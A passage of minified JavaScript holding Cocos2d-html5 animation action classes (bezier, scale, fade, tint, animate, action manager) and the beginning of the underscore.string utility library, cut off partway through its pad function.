		this._cloneDecoration(a);
		for (var b = [], c = 0; c < this._config.length; c++) {
			var d = this._config[c];
			b.push(cc.p(d.x, d.y))
		}
		return a.initWithDuration(this._duration, b), a
	},
	startWithTarget: function(a) {
		cc.ActionInterval.prototype.startWithTarget.call(this, a);
		var b = a.getPositionX(),
			c = a.getPositionY();
		this._previousPosition.x = b, this._previousPosition.y = c, this._startPosition.x = b, this._startPosition.y = c
	},
	update: function(a) {
		if (a = this._computeEaseTime(a), this.target) {
			var b = this._config,
				c = 0,
				d = b[0].x,
				e = b[1].x,
				f = b[2].x,
				g = 0,
				h = b[0].y,
				i = b[1].y,
				j = b[2].y,
				k = cc.bezierAt(c, d, e, f, a),
				l = cc.bezierAt(g, h, i, j, a),
				m = this._startPosition;
			if (cc.ENABLE_STACKABLE_ACTIONS) {
				var n = this.target.getPositionX(),
					o = this.target.getPositionY(),
					p = this._previousPosition;
				m.x = m.x + n - p.x, m.y = m.y + o - p.y, k += m.x, l += m.y, p.x = k, p.y = l, this.target.setPosition(k, l)
			} else this.target.setPosition(m.x + k, m.y + l)
		}
	},
	reverse: function() {
		var a = this._config,
			b = [cc.pAdd(a[1], cc.pNeg(a[2])), cc.pAdd(a[0], cc.pNeg(a[2])), cc.pNeg(a[2])],
			c = cc.BezierBy.create(this._duration, b);
		return this._cloneDecoration(c), this._reverseEaseList(c), c
	}
}), cc.BezierBy.create = function(a, b) {
	return new cc.BezierBy(a, b)
}, cc.BezierTo = cc.BezierBy.extend({
	_toConfig: null,
	ctor: function(a, b) {
		cc.BezierBy.prototype.ctor.call(this), this._toConfig = [], b && this.initWithDuration(a, b)
	},
	initWithDuration: function(a, b) {
		return cc.ActionInterval.prototype.initWithDuration.call(this, a) ? (this._toConfig = b, !0) : !1
	},
	clone: function() {
		var a = new cc.BezierTo;
		return this._cloneDecoration(a), a.initWithDuration(this._duration, this._toConfig), a
	},
	startWithTarget: function(a) {
		cc.BezierBy.prototype.startWithTarget.call(this, a);
		var b = this._startPosition,
			c = this._toConfig,
			d = this._config;
		d[0] = cc.pSub(c[0], b), d[1] = cc.pSub(c[1], b), d[2] = cc.pSub(c[2], b)
	}
}), cc.BezierTo.create = function(a, b) {
	return new cc.BezierTo(a, b)
}, cc.ScaleTo = cc.ActionInterval.extend({
	_scaleX: 1,
	_scaleY: 1,
	_startScaleX: 1,
	_startScaleY: 1,
	_endScaleX: 0,
	_endScaleY: 0,
	_deltaX: 0,
	_deltaY: 0,
	ctor: function(a, b, c) {
		cc.ActionInterval.prototype.ctor.call(this), void 0 !== b && this.initWithDuration(a, b, c)
	},
	initWithDuration: function(a, b, c) {
		return cc.ActionInterval.prototype.initWithDuration.call(this, a) ? (this._endScaleX = b, this._endScaleY = null != c ? c : b, !0) : !1
	},
	clone: function() {
		var a = new cc.ScaleTo;
		return this._cloneDecoration(a), a.initWithDuration(this._duration, this._endScaleX, this._endScaleY), a
	},
	startWithTarget: function(a) {
		cc.ActionInterval.prototype.startWithTarget.call(this, a), this._startScaleX = a.scaleX, this._startScaleY = a.scaleY, this._deltaX = this._endScaleX - this._startScaleX, this._deltaY = this._endScaleY - this._startScaleY
	},
	update: function(a) {
		a = this._computeEaseTime(a), this.target && (this.target.scaleX = this._startScaleX + this._deltaX * a, this.target.scaleY = this._startScaleY + this._deltaY * a)
	}
}), cc.ScaleTo.create = function(a, b, c) {
	var d = new cc.ScaleTo;
	return d.initWithDuration(a, b, c), d
}, cc.ScaleBy = cc.ScaleTo.extend({
	startWithTarget: function(a) {
		cc.ScaleTo.prototype.startWithTarget.call(this, a), this._deltaX = this._startScaleX * this._endScaleX - this._startScaleX, this._deltaY = this._startScaleY * this._endScaleY - this._startScaleY
	},
	reverse: function() {
		var a = cc.ScaleBy.create(this._duration, 1 / this._endScaleX, 1 / this._endScaleY);
		return this._cloneDecoration(a), this._reverseEaseList(a), a
	},
	clone: function() {
		var a = new cc.ScaleBy;
		return this._cloneDecoration(a), a.initWithDuration(this._duration, this._endScaleX, this._endScaleY), a
	}
}), cc.ScaleBy.create = function(a, b, c) {
	return new cc.ScaleBy(a, b, c)
}, cc.Blink = cc.ActionInterval.extend({
	_times: 0,
	_originalState: !1,
	ctor: function(a, b) {
		cc.ActionInterval.prototype.ctor.call(this), void 0 !== b && this.initWithDuration(a, b)
	},
	initWithDuration: function(a, b) {
		return cc.ActionInterval.prototype.initWithDuration.call(this, a) ? (this._times = b, !0) : !1
	},
	clone: function() {
		var a = new cc.Blink;
		return this._cloneDecoration(a), a.initWithDuration(this._duration, this._times), a
	},
	update: function(a) {
		if (a = this._computeEaseTime(a), this.target && !this.isDone()) {
			var b = 1 / this._times,
				c = a % b;
			this.target.visible = c > b / 2
		}
	},
	startWithTarget: function(a) {
		cc.ActionInterval.prototype.startWithTarget.call(this, a), this._originalState = a.visible
	},
	stop: function() {
		this.target.visible = this._originalState, cc.ActionInterval.prototype.stop.call(this)
	},
	reverse: function() {
		var a = cc.Blink.create(this._duration, this._times);
		return this._cloneDecoration(a), this._reverseEaseList(a), a
	}
}), cc.Blink.create = function(a, b) {
	var c = new cc.Blink;
	return c.initWithDuration(a, b), c
}, cc.FadeTo = cc.ActionInterval.extend({
	_toOpacity: 0,
	_fromOpacity: 0,
	ctor: function(a, b) {
		cc.ActionInterval.prototype.ctor.call(this), void 0 !== b && this.initWithDuration(a, b)
	},
	initWithDuration: function(a, b) {
		return cc.ActionInterval.prototype.initWithDuration.call(this, a) ? (this._toOpacity = b, !0) : !1
	},
	clone: function() {
		var a = new cc.FadeTo;
		return this._cloneDecoration(a), a.initWithDuration(this._duration, this._toOpacity), a
	},
	update: function(a) {
		if (a = this._computeEaseTime(a), this.target.RGBAProtocol) {
			var b = void 0 !== this._fromOpacity ? this._fromOpacity : 255;
			this.target.opacity = b + (this._toOpacity - b) * a
		}
	},
	startWithTarget: function(a) {
		cc.ActionInterval.prototype.startWithTarget.call(this, a), this.target.RGBAProtocol && (this._fromOpacity = a.opacity)
	}
}), cc.FadeTo.create = function(a, b) {
	return new cc.FadeTo(a, b)
}, cc.FadeIn = cc.FadeTo.extend({
	_reverseAction: null,
	reverse: function() {
		var a = new cc.FadeOut;
		return a.initWithDuration(this._duration, 0), this._cloneDecoration(a), this._reverseEaseList(a), a
	},
	clone: function() {
		var a = new cc.FadeIn;
		return this._cloneDecoration(a), a.initWithDuration(this._duration, this._toOpacity), a
	},
	startWithTarget: function(a) {
		this._reverseAction && (this._toOpacity = this._reverseAction._fromOpacity), cc.FadeTo.prototype.startWithTarget.call(this, a)
	}
}), cc.FadeIn.create = function(a, b) {
	return null == b && (b = 255), new cc.FadeIn(a, b)
}, cc.FadeOut = cc.FadeTo.extend({
	reverse: function() {
		var a = new cc.FadeIn;
		return a._reverseAction = this, a.initWithDuration(this._duration, 255), this._cloneDecoration(a), this._reverseEaseList(a), a
	},
	clone: function() {
		var a = new cc.FadeOut;
		return this._cloneDecoration(a), a.initWithDuration(this._duration, this._toOpacity), a
	}
}), cc.FadeOut.create = function(a) {
	var b = new cc.FadeOut;
	return b.initWithDuration(a, 0), b
}, cc.TintTo = cc.ActionInterval.extend({
	_to: null,
	_from: null,
	ctor: function(a, b, c, d) {
		cc.ActionInterval.prototype.ctor.call(this), this._to = cc.color(0, 0, 0), this._from = cc.color(0, 0, 0), void 0 !== d && this.initWithDuration(a, b, c, d)
	},
	initWithDuration: function(a, b, c, d) {
		return cc.ActionInterval.prototype.initWithDuration.call(this, a) ? (this._to = cc.color(b, c, d), !0) : !1
	},
	clone: function() {
		var a = new cc.TintTo;
		this._cloneDecoration(a);
		var b = this._to;
		return a.initWithDuration(this._duration, b.r, b.g, b.b), a
	},
	startWithTarget: function(a) {
		cc.ActionInterval.prototype.startWithTarget.call(this, a), this.target.RGBAProtocol && (this._from = this.target.color)
	},
	update: function(a) {
		a = this._computeEaseTime(a);
		var b = this._from,
			c = this._to;
		b && this.target.RGBAProtocol && (this.target.color = cc.color(b.r + (c.r - b.r) * a, b.g + (c.g - b.g) * a, b.b + (c.b - b.b) * a))
	}
}), cc.TintTo.create = function(a, b, c, d) {
	return new cc.TintTo(a, b, c, d)
}, cc.TintBy = cc.ActionInterval.extend({
	_deltaR: 0,
	_deltaG: 0,
	_deltaB: 0,
	_fromR: 0,
	_fromG: 0,
	_fromB: 0,
	ctor: function(a, b, c, d) {
		cc.ActionInterval.prototype.ctor.call(this), void 0 !== d && this.initWithDuration(a, b, c, d)
	},
	initWithDuration: function(a, b, c, d) {
		return cc.ActionInterval.prototype.initWithDuration.call(this, a) ? (this._deltaR = b, this._deltaG = c, this._deltaB = d, !0) : !1
	},
	clone: function() {
		var a = new cc.TintBy;
		return this._cloneDecoration(a), a.initWithDuration(this._duration, this._deltaR, this._deltaG, this._deltaB), a
	},
	startWithTarget: function(a) {
		if (cc.ActionInterval.prototype.startWithTarget.call(this, a), a.RGBAProtocol) {
			var b = a.color;
			this._fromR = b.r, this._fromG = b.g, this._fromB = b.b
		}
	},
	update: function(a) {
		a = this._computeEaseTime(a), this.target.RGBAProtocol && (this.target.color = cc.color(this._fromR + this._deltaR * a, this._fromG + this._deltaG * a, this._fromB + this._deltaB * a))
	},
	reverse: function() {
		var a = cc.TintBy.create(this._duration, -this._deltaR, -this._deltaG, -this._deltaB);
		return this._cloneDecoration(a), this._reverseEaseList(a), a
	}
}), cc.TintBy.create = function(a, b, c, d) {
	return new cc.TintBy(a, b, c, d)
}, cc.DelayTime = cc.ActionInterval.extend({
	update: function() {},
	reverse: function() {
		var a = cc.DelayTime.create(this._duration);
		return this._cloneDecoration(a), this._reverseEaseList(a), a
	},
	clone: function() {
		var a = new cc.DelayTime;
		return this._cloneDecoration(a), a.initWithDuration(this._duration), a
	}
}), cc.DelayTime.create = function(a) {
	return new cc.DelayTime(a)
}, cc.ReverseTime = cc.ActionInterval.extend({
	_other: null,
	ctor: function(a) {
		cc.ActionInterval.prototype.ctor.call(this), this._other = null, a && this.initWithAction(a)
	},
	initWithAction: function(a) {
		if (!a) throw "cc.ReverseTime.initWithAction(): action must be non null";
		if (a == this._other) throw "cc.ReverseTime.initWithAction(): the action was already passed in.";
		return cc.ActionInterval.prototype.initWithDuration.call(this, a._duration) ? (this._other = a, !0) : !1
	},
	clone: function() {
		var a = new cc.ReverseTime;
		return this._cloneDecoration(a), a.initWithAction(this._other.clone()), a
	},
	startWithTarget: function(a) {
		cc.ActionInterval.prototype.startWithTarget.call(this, a), this._other.startWithTarget(a)
	},
	update: function(a) {
		a = this._computeEaseTime(a), this._other && this._other.update(1 - a)
	},
	reverse: function() {
		return this._other.clone()
	},
	stop: function() {
		this._other.stop(), cc.Action.prototype.stop.call(this)
	}
}), cc.ReverseTime.create = function(a) {
	return new cc.ReverseTime(a)
}, cc.Animate = cc.ActionInterval.extend({
	_animation: null,
	_nextFrame: 0,
	_origFrame: null,
	_executedLoops: 0,
	_splitTimes: null,
	ctor: function(a) {
		cc.ActionInterval.prototype.ctor.call(this), this._splitTimes = [], a && this.initWithAnimation(a)
	},
	getAnimation: function() {
		return this._animation
	},
	setAnimation: function(a) {
		this._animation = a
	},
	initWithAnimation: function(a) {
		if (!a) throw "cc.Animate.initWithAnimation(): animation must be non-NULL";
		var b = a.getDuration();
		if (this.initWithDuration(b * a.getLoops())) {
			this._nextFrame = 0, this.setAnimation(a), this._origFrame = null, this._executedLoops = 0;
			var c = this._splitTimes;
			c.length = 0;
			var d = 0,
				e = b / a.getTotalDelayUnits(),
				f = a.getFrames();
			cc.arrayVerifyType(f, cc.AnimationFrame);
			for (var g = 0; g < f.length; g++) {
				var h = f[g],
					i = d * e / b;
				d += h.getDelayUnits(), c.push(i)
			}
			return !0
		}
		return !1
	},
	clone: function() {
		var a = new cc.Animate;
		return this._cloneDecoration(a), a.initWithAnimation(this._animation.clone()), a
	},
	startWithTarget: function(a) {
		cc.ActionInterval.prototype.startWithTarget.call(this, a), this._animation.getRestoreOriginalFrame() && (this._origFrame = a.displayFrame()), this._nextFrame = 0, this._executedLoops = 0
	},
	update: function(a) {
		if (a = this._computeEaseTime(a), 1 > a) {
			a *= this._animation.getLoops();
			var b = 0 | a;
			b > this._executedLoops && (this._nextFrame = 0, this._executedLoops++), a %= 1
		}
		for (var c = this._animation.getFrames(), d = c.length, e = this._splitTimes, f = this._nextFrame; d > f && e[f] <= a; f++) this.target.setSpriteFrame(c[f].getSpriteFrame()), this._nextFrame = f + 1
	},
	reverse: function() {
		var a = this._animation,
			b = a.getFrames(),
			c = [];
		if (cc.arrayVerifyType(b, cc.AnimationFrame), b.length > 0) for (var d = b.length - 1; d >= 0; d--) {
			var e = b[d];
			if (!e) break;
			c.push(e.clone())
		}
		var f = cc.Animation.create(c, a.getDelayPerUnit(), a.getLoops());
		f.setRestoreOriginalFrame(a.getRestoreOriginalFrame());
		var g = cc.Animate.create(f);
		return this._cloneDecoration(g), this._reverseEaseList(g), g
	},
	stop: function() {
		this._animation.getRestoreOriginalFrame() && this.target && this.target.setSpriteFrame(this._origFrame), cc.Action.prototype.stop.call(this)
	}
}), cc.Animate.create = function(a) {
	return new cc.Animate(a)
}, cc.TargetedAction = cc.ActionInterval.extend({
	_action: null,
	_forcedTarget: null,
	ctor: function(a, b) {
		cc.ActionInterval.prototype.ctor.call(this), b && this.initWithTarget(a, b)
	},
	initWithTarget: function(a, b) {
		return this.initWithDuration(b._duration) ? (this._forcedTarget = a, this._action = b, !0) : !1
	},
	clone: function() {
		var a = new cc.TargetedAction;
		return this._cloneDecoration(a), a.initWithTarget(this._forcedTarget, this._action.clone()), a
	},
	startWithTarget: function(a) {
		cc.ActionInterval.prototype.startWithTarget.call(this, a), this._action.startWithTarget(this._forcedTarget)
	},
	stop: function() {
		this._action.stop()
	},
	update: function(a) {
		a = this._computeEaseTime(a), this._action.update(a)
	},
	getForcedTarget: function() {
		return this._forcedTarget
	},
	setForcedTarget: function(a) {
		this._forcedTarget != a && (this._forcedTarget = a)
	}
}), cc.TargetedAction.create = function(a, b) {
	return new cc.TargetedAction(a, b)
};
cc.HashElement = cc.Class.extend({
	actions: null,
	target: null,
	actionIndex: 0,
	currentAction: null,
	currentActionSalvaged: !1,
	paused: !1,
	hh: null,
	ctor: function() {
		this.actions = [], this.target = null, this.actionIndex = 0, this.currentAction = null, this.currentActionSalvaged = !1, this.paused = !1, this.hh = null
	}
}), cc.ActionManager = cc.Class.extend({
	_hashTargets: null,
	_arrayTargets: null,
	_currentTarget: null,
	_currentTargetSalvaged: !1,
	_searchElementByTarget: function(a, b) {
		for (var c = 0; c < a.length; c++) if (b == a[c].target) return a[c];
		return null
	},
	ctor: function() {
		this._hashTargets = {}, this._arrayTargets = [], this._currentTarget = null, this._currentTargetSalvaged = !1
	},
	addAction: function(a, b, c) {
		if (!a) throw "cc.ActionManager.addAction(): action must be non-null";
		if (!b) throw "cc.ActionManager.addAction(): action must be non-null";
		var d = this._hashTargets[b.__instanceId];
		d || (d = new cc.HashElement, d.paused = c, d.target = b, this._hashTargets[b.__instanceId] = d, this._arrayTargets.push(d)), this._actionAllocWithHashElement(d), d.actions.push(a), a.startWithTarget(b)
	},
	removeAllActions: function() {
		for (var a = this._arrayTargets, b = 0; b < a.length; b++) {
			var c = a[b];
			c && this.removeAllActionsFromTarget(c.target, !0)
		}
	},
	removeAllActionsFromTarget: function(a, b) {
		if (null != a) {
			var c = this._hashTargets[a.__instanceId];
			c && (-1 === c.actions.indexOf(c.currentAction) || c.currentActionSalvaged || (c.currentActionSalvaged = !0), c.actions.length = 0, this._currentTarget != c || b ? this._deleteHashElement(c) : this._currentTargetSalvaged = !0)
		}
	},
	removeAction: function(a) {
		if (null != a) {
			var b = a.getOriginalTarget(),
				c = this._hashTargets[b.__instanceId];
			if (c) {
				for (var d = 0; d < c.actions.length; d++) if (c.actions[d] == a) {
					c.actions.splice(d, 1);
					break
				}
			} else cc.log(cc._LogInfos.ActionManager_removeAction)
		}
	},
	removeActionByTag: function(a, b) {
		a == cc.ACTION_TAG_INVALID && cc.log(cc._LogInfos.ActionManager_addAction), cc.assert(b, cc._LogInfos.ActionManager_addAction);
		var c = this._hashTargets[b.__instanceId];
		if (c) for (var d = c.actions.length, e = 0; d > e; ++e) {
			var f = c.actions[e];
			if (f && f.getTag() === a && f.getOriginalTarget() == b) {
				this._removeActionAtIndex(e, c);
				break
			}
		}
	},
	getActionByTag: function(a, b) {
		a == cc.ACTION_TAG_INVALID && cc.log(cc._LogInfos.ActionManager_getActionByTag);
		var c = this._hashTargets[b.__instanceId];
		if (c) {
			if (null != c.actions) for (var d = 0; d < c.actions.length; ++d) {
				var e = c.actions[d];
				if (e && e.getTag() === a) return e
			}
			cc.log(cc._LogInfos.ActionManager_getActionByTag_2, a)
		}
		return null
	},
	numberOfRunningActionsInTarget: function(a) {
		var b = this._hashTargets[a.__instanceId];
		return b ? b.actions ? b.actions.length : 0 : 0
	},
	pauseTarget: function(a) {
		var b = this._hashTargets[a.__instanceId];
		b && (b.paused = !0)
	},
	resumeTarget: function(a) {
		var b = this._hashTargets[a.__instanceId];
		b && (b.paused = !1)
	},
	pauseAllRunningActions: function() {
		for (var a = [], b = this._arrayTargets, c = 0; c < b.length; c++) {
			var d = b[c];
			d && !d.paused && (d.paused = !0, a.push(d.target))
		}
		return a
	},
	resumeTargets: function(a) {
		if (a) for (var b = 0; b < a.length; b++) a[b] && this.resumeTarget(a[b])
	},
	purgeSharedManager: function() {
		cc.director.getScheduler().unscheduleUpdateForTarget(this)
	},
	_removeActionAtIndex: function(a, b) {
		var c = b.actions[a];
		c != b.currentAction || b.currentActionSalvaged || (b.currentActionSalvaged = !0), b.actions.splice(a, 1), b.actionIndex >= a && b.actionIndex--, 0 == b.actions.length && (this._currentTarget == b ? this._currentTargetSalvaged = !0 : this._deleteHashElement(b))
	},
	_deleteHashElement: function(a) {
		a && (delete this._hashTargets[a.target.__instanceId], cc.arrayRemoveObject(this._arrayTargets, a), a.actions = null, a.target = null)
	},
	_actionAllocWithHashElement: function(a) {
		null == a.actions && (a.actions = [])
	},
	update: function(a) {
		for (var c, b = this._arrayTargets, d = 0; d < b.length; d++) {
			if (this._currentTarget = b[d], c = this._currentTarget, !c.paused) for (c.actionIndex = 0; c.actionIndex < c.actions.length; c.actionIndex++) if (c.currentAction = c.actions[c.actionIndex], c.currentAction) {
				if (c.currentActionSalvaged = !1, c.currentAction.step(a * (c.currentAction._speedMethod ? c.currentAction._speed : 1)), c.currentActionSalvaged) c.currentAction = null;
				else if (c.currentAction.isDone()) {
					c.currentAction.stop();
					var e = c.currentAction;
					c.currentAction = null, this.removeAction(e)
				}
				c.currentAction = null
			}
			this._currentTargetSalvaged && 0 === c.actions.length && this._deleteHashElement(c)
		}
	}
});
cc.ActionTweenDelegate = cc.Class.extend({
	updateTweenAction: function() {}
}), cc.ActionTween = cc.ActionInterval.extend({
	key: "",
	from: 0,
	to: 0,
	delta: 0,
	ctor: function(a, b, c, d) {
		cc.ActionInterval.prototype.ctor.call(this), this.key = "", void 0 !== d && this.initWithDuration(a, b, c, d)
	},
	initWithDuration: function(a, b, c, d) {
		return cc.ActionInterval.prototype.initWithDuration.call(this, a) ? (this.key = b, this.to = d, this.from = c, !0) : !1
	},
	startWithTarget: function(a) {
		if (!a || !a.updateTweenAction) throw "cc.ActionTween.startWithTarget(): target must be non-null, and target must implement updateTweenAction function";
		cc.ActionInterval.prototype.startWithTarget.call(this, a), this.delta = this.to - this.from
	},
	update: function(a) {
		this.target.updateTweenAction(this.to - this.delta * (1 - a), this.key)
	},
	reverse: function() {
		return cc.ActionTween.create(this.duration, this.key, this.to, this.from)
	},
	clone: function() {
		var a = new cc.ActionTween;
		return a.initWithDuration(this._duration, this.key, this.from, this.to), a
	}
}), cc.ActionTween.create = function(a, b, c, d) {
	var e = new cc.ActionTween;
	return e.initWithDuration(a, b, c, d) ? e : null
}, cc.action = cc.Action.create, cc.speed = cc.Speed.create, cc.follow = cc.Follow.create, cc.orbitCamera = cc.OrbitCamera.create, cc.cardinalSplineTo = cc.CardinalSplineTo.create, cc.cardinalSplineBy = cc.CardinalSplineBy.create, cc.catmullRomTo = cc.CatmullRomTo.create, cc.catmullRomBy = cc.CatmullRomBy.create, cc.show = cc.Show.create, cc.hide = cc.Hide.create, cc.toggleVisibility = cc.ToggleVisibility.create, cc.removeSelf = cc.RemoveSelf.create, cc.flipX = cc.FlipX.create, cc.flipY = cc.FlipY.create, cc.place = cc.Place.create, cc.callFunc = cc.CallFunc.create, cc.actionInterval = cc.ActionInterval.create, cc.sequence = cc.Sequence.create, cc.repeat = cc.Repeat.create, cc.repeatForever = cc.RepeatForever.create, cc.spawn = cc.Spawn.create, cc.rotateTo = cc.RotateTo.create, cc.rotateBy = cc.RotateBy.create, cc.moveBy = cc.MoveBy.create, cc.moveTo = cc.MoveTo.create, cc.skewTo = cc.SkewTo.create, cc.skewBy = cc.SkewBy.create, cc.jumpBy = cc.JumpBy.create, cc.jumpTo = cc.JumpTo.create, cc.bezierBy = cc.BezierBy.create, cc.bezierTo = cc.BezierTo.create, cc.scaleTo = cc.ScaleTo.create, cc.scaleBy = cc.ScaleBy.create, cc.blink = cc.Blink.create, cc.fadeTo = cc.FadeTo.create, cc.fadeIn = cc.FadeIn.create, cc.fadeOut = cc.FadeOut.create, cc.tintTo = cc.TintTo.create, cc.tintBy = cc.TintBy.create, cc.delayTime = cc.DelayTime.create, cc.reverseTime = cc.ReverseTime.create, cc.animate = cc.Animate.create, cc.targetedAction = cc.TargetedAction.create, cc.actionTween = cc.ActionTween.create;
!
function(e, t) {
	"use strict";
	var n = t.prototype.trim,
		r = t.prototype.trimRight,
		i = t.prototype.trimLeft,
		s = function(e) {
			return e * 1 || 0
		},
		o = function(e, t) {
			if (t < 1) return "";
			var n = "";
			while (t > 0) t & 1 && (n += e), t >>= 1, e += e;
			return n
		},
		u = [].slice,
		a = function(e) {
			return e == null ? "\\s" : e.source ? e.source : "[" + p.escapeRegExp(e) + "]"
		},
		f = {
			lt: "<",
			gt: ">",
			quot: '"',
			apos: "'",
			amp: "&"
		},
		l = {};
	for (var c in f) l[f[c]] = c;
	var h = function() {
			function e(e) {
				return Object.prototype.toString.call(e).slice(8, -1).toLowerCase()
			}
			var n = o,
				r = function() {
					return r.cache.hasOwnProperty(arguments[0]) || (r.cache[arguments[0]] = r.parse(arguments[0])), r.format.call(null, r.cache[arguments[0]], arguments)
				};
			return r.format = function(r, i) {
				var s = 1,
					o = r.length,
					u = "",
					a, f = [],
					l, c, p, d, v, m;
				for (l = 0; l < o; l++) {
					u = e(r[l]);
					if (u === "string") f.push(r[l]);
					else if (u === "array") {
						p = r[l];
						if (p[2]) {
							a = i[s];
							for (c = 0; c < p[2].length; c++) {
								if (!a.hasOwnProperty(p[2][c])) throw new Error(h('[_.sprintf] property "%s" does not exist', p[2][c]));
								a = a[p[2][c]]
							}
						} else p[1] ? a = i[p[1]] : a = i[s++];
						if (/[^s]/.test(p[8]) && e(a) != "number") throw new Error(h("[_.sprintf] expecting number but found %s", e(a)));
						switch (p[8]) {
						case "b":
							a = a.toString(2);
							break;
						case "c":
							a = t.fromCharCode(a);
							break;
						case "d":
							a = parseInt(a, 10);
							break;
						case "e":
							a = p[7] ? a.toExponential(p[7]) : a.toExponential();
							break;
						case "f":
							a = p[7] ? parseFloat(a).toFixed(p[7]) : parseFloat(a);
							break;
						case "o":
							a = a.toString(8);
							break;
						case "s":
							a = (a = t(a)) && p[7] ? a.substring(0, p[7]) : a;
							break;
						case "u":
							a = Math.abs(a);
							break;
						case "x":
							a = a.toString(16);
							break;
						case "X":
							a = a.toString(16).toUpperCase()
						}
						a = /[def]/.test(p[8]) && p[3] && a >= 0 ? "+" + a : a, v = p[4] ? p[4] == "0" ? "0" : p[4].charAt(1) : " ", m = p[6] - t(a).length, d = p[6] ? n(v, m) : "", f.push(p[5] ? a + d : d + a)
					}
				}
				return f.join("")
			}, r.cache = {}, r.parse = function(e) {
				var t = e,
					n = [],
					r = [],
					i = 0;
				while (t) {
						if ((n = /^[^\x25]+/.exec(t)) !== null) r.push(n[0]);
					else if ((n = /^\x25{2}/.exec(t)) !== null) r.push("%");
					else {
						if ((n = /^\x25(?:([1-9]\d*)\$|\(([^\)]+)\))?(\+)?(0|'[^$])?(-)?(\d+)?(?:\.(\d+))?([b-fosuxX])/.exec(t)) === null) throw new Error("[_.sprintf] huh?");
						if (n[2]) {
							i |= 1;
							var s = [],
								o = n[2],
								u = [];
							if ((u = /^([a-z_][a-z_\d]*)/i.exec(o)) === null) throw new Error("[_.sprintf] huh?");
							s.push(u[1]);
							while ((o = o.substring(u[0].length)) !== "") if ((u = /^\.([a-z_][a-z_\d]*)/i.exec(o)) !== null) s.push(u[1]);
							else {
								if ((u = /^\[(\d+)\]/.exec(o)) === null) throw new Error("[_.sprintf] huh?");
								s.push(u[1])
							}
							n[2] = s
						} else i |= 2;
						if (i === 3) throw new Error("[_.sprintf] mixing positional and named placeholders is not (yet) supported");
						r.push(n)
					}
					t = t.substring(n[0].length)
				}
				return r
			}, r
		}(),
		p = {
			VERSION: "2.3.0",
			isBlank: function(e) {
				return e == null && (e = ""), /^\s*$/.test(e)

			},
			stripTags: function(e) {
				return e == null ? "" : t(e).replace(/<\/?[^>]+>/g, "")
			},
			capitalize: function(e) {
				return e = e == null ? "" : t(e), e.charAt(0).toUpperCase() + e.slice(1)
			},
			chop: function(e, n) {
				return e == null ? [] : (e = t(e), n = ~~n, n > 0 ? e.match(new RegExp(".{1," + n + "}", "g")) : [e])
			},
			clean: function(e) {
				return p.strip(e).replace(/\s+/g, " ")
			},
			count: function(e, n) {
				return e == null || n == null ? 0 : t(e).split(n).length - 1
			},
			chars: function(e) {
				return e == null ? [] : t(e).split("")
			},
			swapCase: function(e) {
				return e == null ? "" : t(e).replace(/\S/g, function(e) {
					return e === e.toUpperCase() ? e.toLowerCase() : e.toUpperCase()
				})
			},
			escapeHTML: function(e) {
				return e == null ? "" : t(e).replace(/[&<>"']/g, function(e) {
					return "&" + l[e] + ";"
				})
			},
			unescapeHTML: function(e) {
				return e == null ? "" : t(e).replace(/\&([^;]+);/g, function(e, n) {
					var r;
					return n in f ? f[n] : (r = n.match(/^#x([\da-fA-F]+)$/)) ? t.fromCharCode(parseInt(r[1], 16)) : (r = n.match(/^#(\d+)$/)) ? t.fromCharCode(~~r[1]) : e
				})
			},
			escapeRegExp: function(e) {
				return e == null ? "" : t(e).replace(/([.*+?^=!:${}()|[\]\/\\])/g, "\\$1")
			},
			splice: function(e, t, n, r) {
				var i = p.chars(e);
				return i.splice(~~t, ~~n, r), i.join("")
			},
			insert: function(e, t, n) {
				return p.splice(e, t, 0, n)
			},
			include: function(e, n) {
				return n === "" ? !0 : e == null ? !1 : t(e).indexOf(n) !== -1
			},
			join: function() {
				var e = u.call(arguments),
					t = e.shift();
				return t == null && (t = ""), e.join(t)
			},
			lines: function(e) {
				return e == null ? [] : t(e).split("\n")
			},
			reverse: function(e) {
				return p.chars(e).reverse().join("")
			},
			startsWith: function(e, n) {
				return n === "" ? !0 : e == null || n == null ? !1 : (e = t(e), n = t(n), e.length >= n.length && e.slice(0, n.length) === n)
			},
			endsWith: function(e, n) {
				return n === "" ? !0 : e == null || n == null ? !1 : (e = t(e), n = t(n), e.length >= n.length && e.slice(e.length - n.length) === n)
			},
			succ: function(e) {
				return e == null ? "" : (e = t(e), e.slice(0, -1) + t.fromCharCode(e.charCodeAt(e.length - 1) + 1))
			},
			titleize: function(e) {
				return e == null ? "" : t(e).replace(/(?:^|\s)\S/g, function(e) {
					return e.toUpperCase()
				})
			},
			camelize: function(e) {
				return p.trim(e).replace(/[-_\s]+(.)?/g, function(e, t) {
					return t.toUpperCase()
				})
			},
			underscored: function(e) {
				return p.trim(e).replace(/([a-z\d])([A-Z]+)/g, "$1_$2").replace(/[-\s]+/g, "_").toLowerCase()
			},
			dasherize: function(e) {
				return p.trim(e).replace(/([A-Z])/g, "-$1").replace(/[-_\s]+/g, "-").toLowerCase()
			},
			classify: function(e) {
				return p.titleize(t(e).replace(/_/g, " ")).replace(/\s/g, "")
			},
			humanize: function(e) {
				return p.capitalize(p.underscored(e).replace(/_id$/, "").replace(/_/g, " "))
			},
			trim: function(e, r) {
				return e == null ? "" : !r && n ? n.call(e) : (r = a(r), t(e).replace(new RegExp("^" + r + "+|" + r + "+$", "g"), ""))
			},
			ltrim: function(e, n) {
				return e == null ? "" : !n && i ? i.call(e) : (n = a(n), t(e).replace(new RegExp("^" + n + "+"), ""))
			},
			rtrim: function(e, n) {
				return e == null ? "" : !n && r ? r.call(e) : (n = a(n), t(e).replace(new RegExp(n + "+$"), ""))
			},
			truncate: function(e, n, r) {
				return e == null ? "" : (e = t(e), r = r || "...", n = ~~n, e.length > n ? e.slice(0, n) + r : e)
			},
			prune: function(e, n, r) {
				if (e == null) return "";
				e = t(e), n = ~~n, r = r != null ? t(r) : "...";
				if (e.length <= n) return e;
				var i = function(e) {
						return e.toUpperCase() !== e.toLowerCase() ? "A" : " "
					},
					s = e.slice(0, n + 1).replace(/.(?=\W*\w*$)/g, i);
				return s.slice(s.length - 2).match(/\w\w/) ? s = s.replace(/\s*\S+$/, "") : s = p.rtrim(s.slice(0, s.length - 1)), (s + r).length > e.length ? e : e.slice(0, s.length) + r
			},
			words: function(e, t) {
				return p.isBlank(e) ? [] : p.trim(e, t).split(t || /\s+/)
			},
			pad: function(e, n, r, i) {
				e = e == null ? "" : t(e), n = ~~n;
				var s = 0;
				r ? r.length > 1 && (r = r.charAt(0)) : r = " ";
				switch (i) {
				case "right":
					return s = n - e.length, e + o(r, s);
				case "both":
					return s = n - e.length, o(r, Math.ceil(s / 2)) + e + o(r, Math.floor(s / 2));
				default:
